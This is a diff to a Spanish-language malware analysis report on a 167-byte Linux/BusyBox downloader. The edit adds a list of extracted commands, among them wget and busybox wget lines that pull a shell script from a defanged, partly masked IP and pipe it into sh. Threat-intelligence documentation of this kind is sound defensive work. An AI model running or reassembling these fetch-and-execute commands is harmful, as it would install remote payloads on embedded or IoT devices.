@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with no line terminators de 167 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 167 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
+2. `sh -s iodata`
+3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/47f8e4a93023421f6516fc10c5e994a98e07fd40d5ecf7dd5640cdc6b0c47159.md](../../../../../malware-like/oraculo/downloader/47f8e4a93023421f6516fc10c5e994a98e07fd40d5ecf7dd5640cdc6b0c47159.md)
 
 
 ## 🏷️ Clasificación
